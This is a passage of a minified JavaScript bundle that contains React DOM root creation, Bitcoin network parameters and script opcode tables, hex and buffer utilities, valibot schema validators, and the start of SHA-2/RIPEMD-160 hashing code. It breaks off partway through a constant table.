    if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
      var df = __REACT_DEVTOOLS_GLOBAL_HOOK__;
      if (!df.isDisabled && df.supportsFiber) try {
        g = df.inject(bm), S = df;
      } catch {
      }
    }
    return qa.createRoot = function(t, e) {
      if (!E(t)) throw Error(c(299));
      var n = false, l = "", a = Ns, i = Rs, h = Ds;
      return e != null && (e.unstable_strictMode === true && (n = true), e.identifierPrefix !== void 0 && (l = e.identifierPrefix), e.onUncaughtError !== void 0 && (a = e.onUncaughtError), e.onCaughtError !== void 0 && (i = e.onCaughtError), e.onRecoverableError !== void 0 && (h = e.onRecoverableError)), e = rh(t, 1, false, null, null, n, l, null, a, i, h, bh), t[Wl] = e.current, Tr(t), new Xr(e);
    }, qa.hydrateRoot = function(t, e, n) {
      if (!E(t)) throw Error(c(299));
      var l = false, a = "", i = Ns, h = Rs, d = Ds, _ = null;
      return n != null && (n.unstable_strictMode === true && (l = true), n.identifierPrefix !== void 0 && (a = n.identifierPrefix), n.onUncaughtError !== void 0 && (i = n.onUncaughtError), n.onCaughtError !== void 0 && (h = n.onCaughtError), n.onRecoverableError !== void 0 && (d = n.onRecoverableError), n.formState !== void 0 && (_ = n.formState)), e = rh(t, 1, true, e, n ?? null, l, a, _, i, h, d, bh), e.context = oh(null), n = e.current, l = ze(), l = zf(l), a = $n(l), a.callback = null, Pn(n, a, l), n = l, e.current.lanes = n, Fu(e, n), on(e), t[Wl] = e.current, Tr(t), new hf(e);
    }, qa.version = "19.2.4", qa;
  }
  var Bh;
  function Cm() {
    if (Bh) return Vr.exports;
    Bh = 1;
    function u() {
      if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(u);
      } catch (f) {
        console.error(f);
      }
    }
    return u(), Vr.exports = Mm(), Vr.exports;
  }
  var wm = Cm();
  const Hm = {
    messagePrefix: `Bitcoin Signed Message:
`,
    bech32: "bc",
    bip32: {
      public: 76067358,
      private: 76066276
    },
    pubKeyHash: 0,
    scriptHash: 5,
    wif: 128
  }, Lm = {
    messagePrefix: `Bitcoin Signed Message:
`,
    bech32: "tb",
    bip32: {
      public: 70617039,
      private: 70615956
    },
    pubKeyHash: 111,
    scriptHash: 196,
    wif: 239
  };
  function Ym(u) {
    if (u.length < 8 || u.length > 72 || u[0] !== 48 || u[1] !== u.length - 2 || u[2] !== 2) return false;
    const f = u[3];
    if (f === 0 || 5 + f >= u.length || u[4 + f] !== 2) return false;
    const r = u[5 + f];
    return !(r === 0 || 6 + f + r !== u.length || u[4] & 128 || f > 1 && u[4] === 0 && !(u[5] & 128) || u[f + 6] & 128 || r > 1 && u[f + 6] === 0 && !(u[f + 7] & 128));
  }
  var se;
  (function(u) {
    u[u.OP_FALSE = 0] = "OP_FALSE", u[u.OP_0 = 0] = "OP_0", u[u.OP_PUSHDATA1 = 76] = "OP_PUSHDATA1", u[u.OP_PUSHDATA2 = 77] = "OP_PUSHDATA2", u[u.OP_PUSHDATA4 = 78] = "OP_PUSHDATA4", u[u.OP_1NEGATE = 79] = "OP_1NEGATE", u[u.OP_RESERVED = 80] = "OP_RESERVED", u[u.OP_TRUE = 81] = "OP_TRUE", u[u.OP_1 = 81] = "OP_1", u[u.OP_2 = 82] = "OP_2", u[u.OP_3 = 83] = "OP_3", u[u.OP_4 = 84] = "OP_4", u[u.OP_5 = 85] = "OP_5", u[u.OP_6 = 86] = "OP_6", u[u.OP_7 = 87] = "OP_7", u[u.OP_8 = 88] = "OP_8", u[u.OP_9 = 89] = "OP_9", u[u.OP_10 = 90] = "OP_10", u[u.OP_11 = 91] = "OP_11", u[u.OP_12 = 92] = "OP_12", u[u.OP_13 = 93] = "OP_13", u[u.OP_14 = 94] = "OP_14", u[u.OP_15 = 95] = "OP_15", u[u.OP_16 = 96] = "OP_16", u[u.OP_NOP = 97] = "OP_NOP", u[u.OP_VER = 98] = "OP_VER", u[u.OP_IF = 99] = "OP_IF", u[u.OP_NOTIF = 100] = "OP_NOTIF", u[u.OP_VERIF = 101] = "OP_VERIF", u[u.OP_VERNOTIF = 102] = "OP_VERNOTIF", u[u.OP_ELSE = 103] = "OP_ELSE", u[u.OP_ENDIF = 104] = "OP_ENDIF", u[u.OP_VERIFY = 105] = "OP_VERIFY", u[u.OP_RETURN = 106] = "OP_RETURN", u[u.OP_TOALTSTACK = 107] = "OP_TOALTSTACK", u[u.OP_FROMALTSTACK = 108] = "OP_FROMALTSTACK", u[u.OP_2DROP = 109] = "OP_2DROP", u[u.OP_2DUP = 110] = "OP_2DUP", u[u.OP_3DUP = 111] = "OP_3DUP", u[u.OP_2OVER = 112] = "OP_2OVER", u[u.OP_2ROT = 113] = "OP_2ROT", u[u.OP_2SWAP = 114] = "OP_2SWAP", u[u.OP_IFDUP = 115] = "OP_IFDUP", u[u.OP_DEPTH = 116] = "OP_DEPTH", u[u.OP_DROP = 117] = "OP_DROP", u[u.OP_DUP = 118] = "OP_DUP", u[u.OP_NIP = 119] = "OP_NIP", u[u.OP_OVER = 120] = "OP_OVER", u[u.OP_PICK = 121] = "OP_PICK", u[u.OP_ROLL = 122] = "OP_ROLL", u[u.OP_ROT = 123] = "OP_ROT", u[u.OP_SWAP = 124] = "OP_SWAP", u[u.OP_TUCK = 125] = "OP_TUCK", u[u.OP_CAT = 126] = "OP_CAT", u[u.OP_SUBSTR = 127] = "OP_SUBSTR", u[u.OP_LEFT = 128] = "OP_LEFT", u[u.OP_RIGHT = 129] = "OP_RIGHT", u[u.OP_SIZE = 130] = "OP_SIZE", u[u.OP_INVERT = 131] = "OP_INVERT", u[u.OP_AND = 132] = "OP_AND", u[u.OP_OR = 133] = "OP_OR", u[u.OP_XOR = 134] = "OP_XOR", u[u.OP_EQUAL = 135] = "OP_EQUAL", u[u.OP_EQUALVERIFY = 136] = "OP_EQUALVERIFY", u[u.OP_RESERVED1 = 137] = "OP_RESERVED1", u[u.OP_RESERVED2 = 138] = "OP_RESERVED2", u[u.OP_1ADD = 139] = "OP_1ADD", u[u.OP_1SUB = 140] = "OP_1SUB", u[u.OP_2MUL = 141] = "OP_2MUL", u[u.OP_2DIV = 142] = "OP_2DIV", u[u.OP_NEGATE = 143] = "OP_NEGATE", u[u.OP_ABS = 144] = "OP_ABS", u[u.OP_NOT = 145] = "OP_NOT", u[u.OP_0NOTEQUAL = 146] = "OP_0NOTEQUAL", u[u.OP_ADD = 147] = "OP_ADD", u[u.OP_SUB = 148] = "OP_SUB", u[u.OP_MUL = 149] = "OP_MUL", u[u.OP_DIV = 150] = "OP_DIV", u[u.OP_MOD = 151] = "OP_MOD", u[u.OP_LSHIFT = 152] = "OP_LSHIFT", u[u.OP_RSHIFT = 153] = "OP_RSHIFT", u[u.OP_BOOLAND = 154] = "OP_BOOLAND", u[u.OP_BOOLOR = 155] = "OP_BOOLOR", u[u.OP_NUMEQUAL = 156] = "OP_NUMEQUAL", u[u.OP_NUMEQUALVERIFY = 157] = "OP_NUMEQUALVERIFY", u[u.OP_NUMNOTEQUAL = 158] = "OP_NUMNOTEQUAL", u[u.OP_LESSTHAN = 159] = "OP_LESSTHAN", u[u.OP_GREATERTHAN = 160] = "OP_GREATERTHAN", u[u.OP_LESSTHANOREQUAL = 161] = "OP_LESSTHANOREQUAL", u[u.OP_GREATERTHANOREQUAL = 162] = "OP_GREATERTHANOREQUAL", u[u.OP_MIN = 163] = "OP_MIN", u[u.OP_MAX = 164] = "OP_MAX", u[u.OP_WITHIN = 165] = "OP_WITHIN", u[u.OP_RIPEMD160 = 166] = "OP_RIPEMD160", u[u.OP_SHA1 = 167] = "OP_SHA1", u[u.OP_SHA256 = 168] = "OP_SHA256", u[u.OP_HASH160 = 169] = "OP_HASH160", u[u.OP_HASH256 = 170] = "OP_HASH256", u[u.OP_CODESEPARATOR = 171] = "OP_CODESEPARATOR", u[u.OP_CHECKSIG = 172] = "OP_CHECKSIG", u[u.OP_CHECKSIGVERIFY = 173] = "OP_CHECKSIGVERIFY", u[u.OP_CHECKMULTISIG = 174] = "OP_CHECKMULTISIG", u[u.OP_CHECKMULTISIGVERIFY = 175] = "OP_CHECKMULTISIGVERIFY", u[u.OP_NOP1 = 176] = "OP_NOP1", u[u.OP_CHECKLOCKTIMEVERIFY = 177] = "OP_CHECKLOCKTIMEVERIFY", u[u.OP_NOP2 = 177] = "OP_NOP2", u[u.OP_CHECKSEQUENCEVERIFY = 178] = "OP_CHECKSEQUENCEVERIFY", u[u.OP_NOP3 = 178] = "OP_NOP3", u[u.OP_NOP4 = 179] = "OP_NOP4", u[u.OP_NOP5 = 180] = "OP_NOP5", u[u.OP_NOP6 = 181] = "OP_NOP6", u[u.OP_NOP7 = 182] = "OP_NOP7", u[u.OP_NOP8 = 183] = "OP_NOP8", u[u.OP_NOP9 = 184] = "OP_NOP9", u[u.OP_NOP10 = 185] = "OP_NOP10", u[u.OP_CHECKSIGADD = 186] = "OP_CHECKSIGADD", u[u.OP_PUBKEYHASH = 253] = "OP_PUBKEYHASH", u[u.OP_PUBKEY = 254] = "OP_PUBKEY", u[u.OP_INVALIDOPCODE = 255] = "OP_INVALIDOPCODE";
  })(se || (se = {}));
  const vf = "0123456789abcdefABCDEF", pf = vf.split("").map((u) => u.codePointAt(0)), Ef = Array(256).fill(true).map((u, f) => {
    const r = String.fromCodePoint(f), c = vf.indexOf(r);
    return c < 0 ? void 0 : c < 16 ? c : c - 6;
  }), Gm = new TextEncoder(), qm = new TextDecoder();
  function od(u) {
    const f = u.reduce((E, b) => E + b.length, 0), r = new Uint8Array(f);
    let c = 0;
    for (const E of u) r.set(E, c), c += E.length;
    return r;
  }
  function Jl(u) {
    const f = u || new Uint8Array();
    return f.length > 512 ? Xm(f) : jm(f);
  }
  function jm(u) {
    let f = "";
    for (let r = 0; r < u.length; ++r) f += vf[Ef[pf[u[r] >> 4]]], f += vf[Ef[pf[u[r] & 15]]];
    return f;
  }
  function Xm(u) {
    const f = new Uint8Array(u.length * 2);
    for (let r = 0; r < u.length; ++r) f[r * 2] = pf[u[r] >> 4], f[r * 2 + 1] = pf[u[r] & 15];
    return qm.decode(f);
  }
  function Ia(u) {
    const f = Gm.encode(u || ""), r = new Uint8Array(Math.floor(f.length / 2));
    let c;
    for (c = 0; c < r.length; c++) {
      const E = Ef[f[c * 2]], b = Ef[f[c * 2 + 1]];
      if (E === void 0 || b === void 0) break;
      r[c] = E << 4 | b;
    }
    return c === r.length ? r : r.slice(0, c);
  }
  function Je(u, f) {
    const r = Math.min(u.length, f.length);
    for (let c = 0; c < r; ++c) if (u[c] !== f[c]) return u[c] < f[c] ? -1 : 1;
    return u.length === f.length ? 0 : u.length > f.length ? 1 : -1;
  }
  function El(u, f, r) {
    if (f + 1 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (r > 255) throw new Error(`The value of "value" is out of range. It must be >= 0 and <= 255. Received ${r}`);
    return u[f] = r, f + 1;
  }
  function Km(u, f, r, c) {
    if (f + 2 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (c = c.toUpperCase(), r > 65535) throw new Error(`The value of "value" is out of range. It must be >= 0 and <= 65535. Received ${r}`);
    return c === "LE" ? (u[f] = r & 255, u[f + 1] = r >> 8 & 255) : (u[f] = r >> 8 & 255, u[f + 1] = r & 255), f + 2;
  }
  function sd(u, f, r, c) {
    if (f + 4 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (c = c.toUpperCase(), r > 4294967295) throw new Error(`The value of "value" is out of range. It must be >= 0 and <= ${4294967295}. Received ${r}`);
    return c === "LE" ? (u[f] = r & 255, u[f + 1] = r >> 8 & 255, u[f + 2] = r >> 16 & 255, u[f + 3] = r >> 24 & 255) : (u[f] = r >> 24 & 255, u[f + 1] = r >> 16 & 255, u[f + 2] = r >> 8 & 255, u[f + 3] = r & 255), f + 4;
  }
  function i0(u, f) {
    if (f + 1 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    return u[f];
  }
  function Qm(u, f, r) {
    if (f + 2 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (r = r.toUpperCase(), r === "LE") {
      let c = 0;
      return c = (c << 8) + u[f + 1], c = (c << 8) + u[f], c;
    } else {
      let c = 0;
      return c = (c << 8) + u[f], c = (c << 8) + u[f + 1], c;
    }
  }
  function hd(u, f, r) {
    if (f + 4 > u.length) throw new Error("Offset is outside the bounds of Uint8Array");
    if (r = r.toUpperCase(), r === "LE") {
      let c = 0;
      return c = (c << 8) + u[f + 3] >>> 0, c = (c << 8) + u[f + 2] >>> 0, c = (c << 8) + u[f + 1] >>> 0, c = (c << 8) + u[f] >>> 0, c;
    } else {
      let c = 0;
      return c = (c << 8) + u[f] >>> 0, c = (c << 8) + u[f + 1] >>> 0, c = (c << 8) + u[f + 2] >>> 0, c = (c << 8) + u[f + 3] >>> 0, c;
    }
  }
  function dd(u) {
    return u < se.OP_PUSHDATA1 ? 1 : u <= 255 ? 2 : u <= 65535 ? 3 : 5;
  }
  function Vm(u, f, r) {
    const c = dd(f);
    return c === 1 ? El(u, r, f) : c === 2 ? (El(u, r, se.OP_PUSHDATA1), El(u, r + 1, f)) : c === 3 ? (El(u, r, se.OP_PUSHDATA2), Km(u, r + 1, f, "LE")) : (El(u, r, se.OP_PUSHDATA4), sd(u, r + 1, f, "LE")), c;
  }
  function Zm(u, f) {
    const r = i0(u, f);
    let c, E;
    if (r < se.OP_PUSHDATA1) c = r, E = 1;
    else if (r === se.OP_PUSHDATA1) {
      if (f + 2 > u.length) return null;
      c = i0(u, f + 1), E = 2;
    } else if (r === se.OP_PUSHDATA2) {
      if (f + 3 > u.length) return null;
      c = Qm(u, f + 1, "LE"), E = 3;
    } else {
      if (f + 5 > u.length) return null;
      if (r !== se.OP_PUSHDATA4) throw new Error("Unexpected opcode");
      c = hd(u, f + 1, "LE"), E = 5;
    }
    return {
      opcode: r,
      number: c,
      size: E
    };
  }
  let Fr;
  function yd(u) {
    return {
      lang: (u == null ? void 0 : u.lang) ?? (Fr == null ? void 0 : Fr.lang),
      message: u == null ? void 0 : u.message,
      abortEarly: (u == null ? void 0 : u.abortEarly) ?? (Fr == null ? void 0 : Fr.abortEarly),
      abortPipeEarly: (u == null ? void 0 : u.abortPipeEarly) ?? (Fr == null ? void 0 : Fr.abortPipeEarly)
    };
  }
  let Im;
  function Jm(u) {
    return Im == null ? void 0 : Im.get(u);
  }
  let Fm;
  function km(u) {
    return Fm == null ? void 0 : Fm.get(u);
  }
  let $m;
  function Pm(u, f) {
    var _a;
    return (_a = $m == null ? void 0 : $m.get(u)) == null ? void 0 : _a.get(f);
  }
  function Wm(u) {
    var _a, _b;
    const f = typeof u;
    return f === "string" ? `"${u}"` : f === "number" || f === "bigint" || f === "boolean" ? `${u}` : f === "object" || f === "function" ? (u && ((_b = (_a = Object.getPrototypeOf(u)) == null ? void 0 : _a.constructor) == null ? void 0 : _b.name)) ?? "null" : f;
  }
  function mn(u, f, r, c, E) {
    const b = E && "input" in E ? E.input : r.value, p = (E == null ? void 0 : E.expected) ?? u.expects ?? null, x = (E == null ? void 0 : E.received) ?? Wm(b), A = {
      kind: u.kind,
      type: u.type,
      input: b,
      expected: p,
      received: x,
      message: `Invalid ${f}: ${p ? `Expected ${p} but r` : "R"}eceived ${x}`,
      requirement: u.requirement,
      path: E == null ? void 0 : E.path,
      issues: E == null ? void 0 : E.issues,
      lang: c.lang,
      abortEarly: c.abortEarly,
      abortPipeEarly: c.abortPipeEarly
    }, v = u.kind === "schema", m = (E == null ? void 0 : E.message) ?? u.message ?? Pm(u.reference, A.lang) ?? (v ? km(A.lang) : null) ?? c.message ?? Jm(A.lang);
    m !== void 0 && (A.message = typeof m == "function" ? m(A) : m), v && (r.typed = false), r.issues ? r.issues.push(A) : r.issues = [
      A
    ];
  }
  function gn(u) {
    return {
      version: 1,
      vendor: "valibot",
      validate(f) {
        return u["~run"]({
          value: f
        }, yd());
      }
    };
  }
  function tg(u, f) {
    const r = [
      ...new Set(u)
    ];
    return r.length > 1 ? `(${r.join(` ${f} `)})` : r[0] ?? "never";
  }
  var eg = class extends Error {
    constructor(f) {
      super(f[0].message), this.name = "ValiError", this.issues = f;
    }
  };
  function md(u, f) {
    return {
      kind: "validation",
      type: "length",
      reference: md,
      async: false,
      expects: `${u}`,
      requirement: u,
      message: f,
      "~run"(r, c) {
        return r.typed && r.value.length !== this.requirement && mn(this, "length", r, c, {
          received: `${r.value.length}`
        }), r;
      }
    };
  }
  function ng(u, f, r) {
    return typeof u.fallback == "function" ? u.fallback(f, r) : u.fallback;
  }
  function gd(u, f, r) {
    return typeof u.default == "function" ? u.default(f, r) : u.default;
  }
  function lg(u, f) {
    return !u["~run"]({
      value: f
    }, {
      abortEarly: true
    }).issues;
  }
  function vd(u, f) {
    return {
      kind: "schema",
      type: "array",
      reference: vd,
      expects: "Array",
      async: false,
      item: u,
      message: f,
      get "~standard"() {
        return gn(this);
      },
      "~run"(r, c) {
        var _a;
        const E = r.value;
        if (Array.isArray(E)) {
          r.typed = true, r.value = [];
          for (let b = 0; b < E.length; b++) {
            const p = E[b], x = this.item["~run"]({
              value: p
            }, c);
            if (x.issues) {
              const A = {
                type: "array",
                origin: "value",
                input: E,
                key: b,
                value: p
              };
              for (const v of x.issues) v.path ? v.path.unshift(A) : v.path = [
                A
              ], (_a = r.issues) == null ? void 0 : _a.push(v);
              if (r.issues || (r.issues = x.issues), c.abortEarly) {
                r.typed = false;
                break;
              }
            }
            x.typed || (r.typed = false), r.value.push(x.value);
          }
        } else mn(this, "type", r, c);
        return r;
      }
    };
  }
  function f0(u, f) {
    return {
      kind: "schema",
      type: "custom",
      reference: f0,
      expects: "unknown",
      async: false,
      check: u,
      message: f,
      get "~standard"() {
        return gn(this);
      },
      "~run"(r, c) {
        return this.check(r.value) ? r.typed = true : mn(this, "type", r, c), r;
      }
    };
  }
  function Sf(u, f) {
    return {
      kind: "schema",
      type: "instance",
      reference: Sf,
      expects: u.name,
      async: false,
      class: u,
      message: f,
      get "~standard"() {
        return gn(this);
      },
      "~run"(r, c) {
        return r.value instanceof this.class ? r.typed = true : mn(this, "type", r, c), r;
      }
    };
  }
  function pd(u) {
    return {
      kind: "schema",
      type: "number",
      reference: pd,
      expects: "number",
      async: false,
      message: u,
      get "~standard"() {
        return gn(this);
      },
      "~run"(f, r) {
        return typeof f.value == "number" && !isNaN(f.value) ? f.typed = true : mn(this, "type", f, r), f;
      }
    };
  }
  function c0(u, f) {
    return {
      kind: "schema",
      type: "object",
      reference: c0,
      expects: "Object",
      async: false,
      entries: u,
      message: f,
      get "~standard"() {
        return gn(this);
      },
      "~run"(r, c) {
        var _a;
        const E = r.value;
        if (E && typeof E == "object") {
          r.typed = true, r.value = {};
          for (const b in this.entries) {
            const p = this.entries[b];
            if (b in E || (p.type === "exact_optional" || p.type === "optional" || p.type === "nullish") && p.default !== void 0) {
              const x = b in E ? E[b] : gd(p), A = p["~run"]({
                value: x
              }, c);
              if (A.issues) {
                const v = {
                  type: "object",
                  origin: "value",
                  input: E,
                  key: b,
                  value: x
                };
                for (const m of A.issues) m.path ? m.path.unshift(v) : m.path = [
                  v
                ], (_a = r.issues) == null ? void 0 : _a.push(m);
                if (r.issues || (r.issues = A.issues), c.abortEarly) {
                  r.typed = false;
                  break;
                }
              }
              A.typed || (r.typed = false), r.value[b] = A.value;
            } else if (p.fallback !== void 0) r.value[b] = ng(p);
            else if (p.type !== "exact_optional" && p.type !== "optional" && p.type !== "nullish" && (mn(this, "key", r, c, {
              input: void 0,
              expected: `"${b}"`,
              path: [
                {
                  type: "object",
                  origin: "key",
                  input: E,
                  key: b,
                  value: E[b]
                }
              ]
            }), c.abortEarly)) break;
          }
        } else mn(this, "type", r, c);
        return r;
      }
    };
  }
  function Ed(u, f) {
    return {
      kind: "schema",
      type: "optional",
      reference: Ed,
      expects: `(${u.expects} | undefined)`,
      async: false,
      wrapped: u,
      default: f,
      get "~standard"() {
        return gn(this);
      },
      "~run"(r, c) {
        return r.value === void 0 && (this.default !== void 0 && (r.value = gd(this, r, c)), r.value === void 0) ? (r.typed = true, r) : this.wrapped["~run"](r, c);
      }
    };
  }
  function bd(u) {
    return {
      kind: "schema",
      type: "string",
      reference: bd,
      expects: "string",
      async: false,
      message: u,
      get "~standard"() {
        return gn(this);
      },
      "~run"(f, r) {
        return typeof f.value == "string" ? f.typed = true : mn(this, "type", f, r), f;
      }
    };
  }
  function zh(u) {
    let f;
    if (u) for (const r of u) f ? f.push(...r.issues) : f = r.issues;
    return f;
  }
  function _d(u, f) {
    return {
      kind: "schema",
      type: "union",
      reference: _d,
      expects: tg(u.map((r) => r.expects), "|"),
      async: false,
      options: u,
      message: f,
      get "~standard"() {
        return gn(this);
      },
      "~run"(r, c) {
        let E, b, p;
        for (const x of this.options) {
          const A = x["~run"]({
            value: r.value
          }, c);
          if (A.typed) if (A.issues) b ? b.push(A) : b = [
            A
          ];
          else {
            E = A;
            break;
          }
          else p ? p.push(A) : p = [
            A
          ];
        }
        if (E) return E;
        if (b) {
          if (b.length === 1) return b[0];
          mn(this, "type", r, c, {
            issues: zh(b)
          }), r.typed = true;
        } else {
          if ((p == null ? void 0 : p.length) === 1) return p[0];
          mn(this, "type", r, c, {
            issues: zh(p)
          });
        }
        return r;
      }
    };
  }
  function d0(u, f, r) {
    const c = u["~run"]({
      value: f
    }, yd(r));
    if (c.issues) throw new eg(c.issues);
    return c.value;
  }
  function ug(u, f) {
    const r = {};
    for (const c in u.entries) r[c] = Ed(u.entries[c]);
    return {
      ...u,
      entries: r,
      get "~standard"() {
        return gn(this);
      }
    };
  }
  function ag(...u) {
    return {
      ...u[0],
      pipe: u,
      get "~standard"() {
        return gn(this);
      },
      "~run"(f, r) {
        for (const c of u) if (c.kind !== "metadata") {
          if (f.issues && (c.kind === "schema" || c.kind === "transformation")) {
            f.typed = false;
            break;
          }
          (!f.issues || !r.abortEarly && !r.abortPipeEarly) && (f = c["~run"](f, r));
        }
        return f;
      }
    };
  }
  const Mh = new Uint8Array(32), Ch = Ia("fffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"), Ad = (u) => ag(Sf(Uint8Array), md(u));
  function wh(u) {
    if (!(u instanceof Uint8Array) || u.length < 33) return false;
    const f = u[0], r = u.slice(1, 33);
    if (Je(Mh, r) === 0 || Je(r, Ch) >= 0) return false;
    if ((f === 2 || f === 3) && u.length === 33) return true;
    const c = u.slice(33);
    return Je(Mh, c) === 0 || Je(c, Ch) >= 0 ? false : f === 4 && u.length === 65;
  }
  const ig = Ad(20), Td = Sf(Uint8Array), fg = se.OP_RESERVED, Sd = vd(_d([
    Sf(Uint8Array),
    pd()
  ]));
  function r0(u) {
    if (u.length === 0) return se.OP_0;
    if (u.length === 1) {
      if (u[0] >= 1 && u[0] <= 16) return fg + u[0];
      if (u[0] === 129) return se.OP_1NEGATE;
    }
  }
  function cg(u) {
    return u instanceof Uint8Array;
  }
  function rg(u) {
    return lg(Sd, u);
  }
  function Hh(u) {
    return u instanceof Uint8Array;
  }
  function Lh(u) {
    if (cg(u)) return u;
    d0(Sd, u);
    const f = u.reduce((E, b) => Hh(b) ? b.length === 1 && r0(b) !== void 0 ? E + 1 : E + dd(b.length) + b.length : E + 1, 0), r = new Uint8Array(f);
    let c = 0;
    if (u.forEach((E) => {
      if (Hh(E)) {
        const b = r0(E);
        if (b !== void 0) {
          El(r, c, b), c += 1;
          return;
        }
        c += Vm(r, E.length, c), r.set(E, c), c += E.length;
      } else El(r, c, E), c += 1;
    }), c !== r.length) throw new Error("Could not decode chunks");
    return r;
  }
  function og(u) {
    if (rg(u)) return u;
    d0(Td, u);
    const f = [];
    let r = 0;
    for (; r < u.length; ) {
      const c = u[r];
      if (c > se.OP_0 && c <= se.OP_PUSHDATA4) {
        const E = Zm(u, r);
        if (E === null || (r += E.size, r + E.number > u.length)) return null;
        const b = u.slice(r, r + E.number);
        r += E.number;
        const p = r0(b);
        p !== void 0 ? f.push(p) : f.push(b);
      } else f.push(c), r += 1;
    }
    return f;
  }
  function sg(u) {
    const f = u & -129;
    return f > 0 && f < 4;
  }
  function Yh(u) {
    return !(u instanceof Uint8Array) || !sg(u[u.length - 1]) ? false : Ym(u.slice(0, -1));
  }
  function Ql(u, f, r) {
    Object.defineProperty(u, f, {
      configurable: true,
      enumerable: true,
      get() {
        const c = r.call(this);
        return this[f] = c, c;
      },
      set(c) {
        Object.defineProperty(this, f, {
          configurable: true,
          enumerable: true,
          value: c,
          writable: true
        });
      }
    });
  }
  function Gh(u) {
    let f;
    return () => (f !== void 0 || (f = u()), f);
  }
  const hg = se;
  hg.OP_RESERVED;
  function dg(u) {
    return u instanceof Uint8Array || ArrayBuffer.isView(u) && u.constructor.name === "Uint8Array";
  }
  function y0(u, ...f) {
    if (!dg(u)) throw new Error("Uint8Array expected");
    if (f.length > 0 && !f.includes(u.length)) throw new Error("Uint8Array expected of length " + f + ", got length=" + u.length);
  }
  function qh(u, f = true) {
    if (u.destroyed) throw new Error("Hash instance has been destroyed");
    if (f && u.finished) throw new Error("Hash#digest() has already been called");
  }
  function yg(u, f) {
    y0(u);
    const r = f.outputLen;
    if (u.length < r) throw new Error("digestInto() expects output buffer of length at least " + r);
  }
  function Xa(...u) {
    for (let f = 0; f < u.length; f++) u[f].fill(0);
  }
  function kr(u) {
    return new DataView(u.buffer, u.byteOffset, u.byteLength);
  }
  function sn(u, f) {
    return u << 32 - f | u >>> f;
  }
  function yf(u, f) {
    return u << f | u >>> 32 - f >>> 0;
  }
  function mg(u) {
    if (typeof u != "string") throw new Error("string expected");
    return new Uint8Array(new TextEncoder().encode(u));
  }
  function Ud(u) {
    return typeof u == "string" && (u = mg(u)), y0(u), u;
  }
  class gg {
  }
  function xd(u) {
    const f = (c) => u().update(Ud(c)).digest(), r = u();
    return f.outputLen = r.outputLen, f.blockLen = r.blockLen, f.create = () => u(), f;
  }
  function vg(u, f, r, c) {
    if (typeof u.setBigUint64 == "function") return u.setBigUint64(f, r, c);
    const E = BigInt(32), b = BigInt(4294967295), p = Number(r >> E & b), x = Number(r & b), A = c ? 4 : 0, v = c ? 0 : 4;
    u.setUint32(f + A, p, c), u.setUint32(f + v, x, c);
  }
  function pg(u, f, r) {
    return u & f ^ ~u & r;
  }
  function Eg(u, f, r) {
    return u & f ^ u & r ^ f & r;
  }
  class Od extends gg {
    constructor(f, r, c, E) {
      super(), this.finished = false, this.length = 0, this.pos = 0, this.destroyed = false, this.blockLen = f, this.outputLen = r, this.padOffset = c, this.isLE = E, this.buffer = new Uint8Array(f), this.view = kr(this.buffer);
    }
    update(f) {
      qh(this), f = Ud(f), y0(f);
      const { view: r, buffer: c, blockLen: E } = this, b = f.length;
      for (let p = 0; p < b; ) {
        const x = Math.min(E - this.pos, b - p);
        if (x === E) {
          const A = kr(f);
          for (; E <= b - p; p += E) this.process(A, p);
          continue;
        }
        c.set(f.subarray(p, p + x), this.pos), this.pos += x, p += x, this.pos === E && (this.process(r, 0), this.pos = 0);
      }
      return this.length += f.length, this.roundClean(), this;
    }
    digestInto(f) {
      qh(this), yg(f, this), this.finished = true;
      const { buffer: r, view: c, blockLen: E, isLE: b } = this;
      let { pos: p } = this;
      r[p++] = 128, Xa(this.buffer.subarray(p)), this.padOffset > E - p && (this.process(c, 0), p = 0);
      for (let B = p; B < E; B++) r[B] = 0;
      vg(c, E - 8, BigInt(this.length * 8), b), this.process(c, 0);
      const x = kr(f), A = this.outputLen;
      if (A % 4) throw new Error("_sha2: outputLen should be aligned to 32bit");
      const v = A / 4, m = this.get();
      if (v > m.length) throw new Error("_sha2: outputLen bigger than state");
      for (let B = 0; B < v; B++) x.setUint32(4 * B, m[B], b);
    }
    digest() {
      const { buffer: f, outputLen: r } = this;
      this.digestInto(f);
      const c = f.slice(0, r);
      return this.destroy(), c;
    }
    _cloneInto(f) {
      f || (f = new this.constructor()), f.set(...this.get());
      const { blockLen: r, buffer: c, length: E, finished: b, destroyed: p, pos: x } = this;
      return f.destroyed = p, f.finished = b, f.length = E, f.pos = x, E % r && f.buffer.set(c), f;
    }
    clone() {
      return this._cloneInto();
    }
  }
  const yl = Uint32Array.from([
    1779033703,
    3144134277,
    1013904242,
    2773480762,
    1359893119,
    2600822924,
    528734635,
    1541459225
  ]), bg = Uint8Array.from([
    7,
    4,
    13,
    1,
    10,
    6,
    15,
    3,
    12,
    0,
    9,
    5,
    2,
    14,
    11,
    8
  ]), Nd = Uint8Array.from(new Array(16).fill(0).map((u, f) => f)), _g = Nd.map((u) => (9 * u + 5) % 16), Rd = (() => {
    const r = [
      [
        Nd
      ],
      [
        _g
      ]
    ];
    for (let c = 0; c < 4; c++) for (let E of r) E.push(E[c].map((b) => bg[b]));
    return r;
  })(), Dd = Rd[0], Bd = Rd[1], zd = [
    [
      11,
      14,
      15,
      12,
      5,
      8,
      7,
      9,
      11,
      13,
      14,
      15,
      6,
      7,
      9,
      8
    ],
    [
      12,
      13,
      11,
      15,
      6,
      9,
      9,
      7,
      12,
      15,
      11,
      13,
      7,
      8,
      7,
      7
    ],
    [
      13,
      15,
      14,
      11,
      7,
      7,
      6,
      8,
      13,
      14,
      13,
      12,
      5,
      5,
      6,
      9
    ],
    [
      14,
      11,
      12,
      14,
      8,
      6,
      5,
      5,
      15,
      12,
      15,
      14,
      9,
      9,
      8,
      6
    ],
    [
      15,
      12,
      13,
      13,
      9,
      5,
      8,
      6,
      14,
      11,
      12,
      11,
      8,
      6,
      5,
      5
    ]
